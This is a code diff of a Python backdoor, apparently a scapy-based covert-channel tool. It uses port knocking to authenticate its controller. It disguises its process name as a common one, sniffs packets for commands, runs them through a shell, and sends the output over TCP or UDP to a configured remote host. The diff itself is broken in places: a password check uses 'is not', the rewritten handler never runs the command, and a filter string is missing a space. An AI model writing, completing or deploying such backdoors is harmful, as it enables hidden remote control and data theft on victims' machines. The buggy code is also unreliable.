@@ -13,7 +13,11 @@ import config
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 code = 0
-attackerIP = ""
+localIP = config.localIP
+localPort = config.localPort
+remoteIP = config.remoteIP
+remotePort = config.remotePort
+protocol = config.protocol
 
 
 def portKnocking(packet):
@@ -37,37 +41,33 @@ def portKnocking(packet):
             else:
                 print("Authetication failed. Wrong sequence...")
 
-def craftPacket(data):
-    packet = IP(src=config.localIP, dst=config.remoteIP)/UDP(sport=config.localPort, dport=config.remotePort)/Raw(load=data)
-    return packet
+def sendPacket(data):
+    if protocol.upper() == 'TCP':
+        packet = IP(dst=remoteIP, src=localIP)/TCP(dport=remotePort, sport=localPort)/Raw(load=data)
+    elif protocol.upper() == 'UDP':
+        packet = IP(dst=remoteIP, src=localIP)/UDP(dport=remotePort, sport=localPort)/Raw(load=data)
+    send(packet, verbose=True)
 
 def executeCmd(packet, cmd):
     print("Executing command: {}".format(cmd))
     result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     result = result.stdout.read() + result.stderr.read()
     print("Result: %s" % result)
-    packet = craftPacket(result)
-    send(packet)
+    sendPacket(result)
     time.sleep(0.1)
 
-
 def parsePacket(packet):
-    if packet.haslayer(IP) and packet.haslayer(Raw):
-        if packet[IP].src != attackerIP:
-            return
-        payload = packet['Raw'].load
-        payload = payload.decode("utf8")
-        cmd = payload.split(' ')
-        cmdType = cmd[0]
-        if cmdType == "shell":
-            cmdString = ' '.join(string for string in cmd[1:])
-            executeCmd(packet, cmdString)
-            sys.exit(0)
-        elif cmdType == "exit":
-            print("Backdoor exited.")
-            sys.exit(0)
-        else:
-            print("Incorrected command")
+    payload = packet[protocol].payload.load
+    payload = encryption.decrypt(payload)
+
+    if payload == "":
+        return
+    password = payload[:8]
+    cmd = payload[8:]
+
+    if password is not config.password:
+        return
+
 
 def checkRootPrivilege():
     if os.getuid() != 0:
@@ -80,13 +80,25 @@ def maskProcess():
     setproctitle.setproctitle(cmdResult)
     print("Most common process for ps command: {}".format(cmdResult))
 
+def is_incoming(packet):
+    """
+    Check if packets are incoming or outgoing.
+    """
+    # Get the default hardware interface
+    defaultInterface = netifaces.gateways()['default'][netifaces.AF_INET][1]
+    hardwareAddr = netifaces.ifaddresses(defaultInterface)[netifaces.AF_LINK][0]['addr']
+
+    return packet[Ether].src != hardwareAddr
+
 def main():
     maskProcess()
     checkRootPrivilege()
+    mFilter = protocol + "and src host " + remoteIP + " and dst port " + str(localPort) + \
+            " and src port " + str(remotePort)
     while code != 3:
         sniff(filter="udp and dst port {}".format(config.listenPort), prn=portKnocking, count=1)
     while True:
-        sniff(filter="tcp and dst port {}".format(config.localPort), prn=parsePacket, count=1)
+        sniff(lfilter=is_incoming, filter=mFilter, prn=parsePacket, count=1)
 
 if __name__ == '__main__':
     main()
